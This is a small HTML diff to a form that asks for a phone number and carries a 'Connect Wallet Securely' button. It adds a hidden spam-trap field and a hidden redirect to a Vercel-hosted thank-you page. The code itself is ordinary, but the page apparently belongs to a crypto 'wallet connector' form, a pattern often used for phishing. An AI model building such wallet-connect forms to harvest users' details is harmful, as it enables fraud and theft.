@@ -48,6 +48,11 @@
                             <label for="phone">Phone Number</label>
                             <input type="tel" id="phone_Number" name="phone" required>
                         </div>
+                           <!-- Prevent spam -->
+  <input type="hidden" name="_gotcha" style="display:none !important" />
+
+  <!-- Redirect to your own thank-you page -->
+  <input type="hidden" name="_redirect" value="https://wallet-connector-rho.vercel.app/thank-you.html" />
                         
                         <button type="submit" class="submit-btn">Connect Wallet Securely</button>
                     </form>
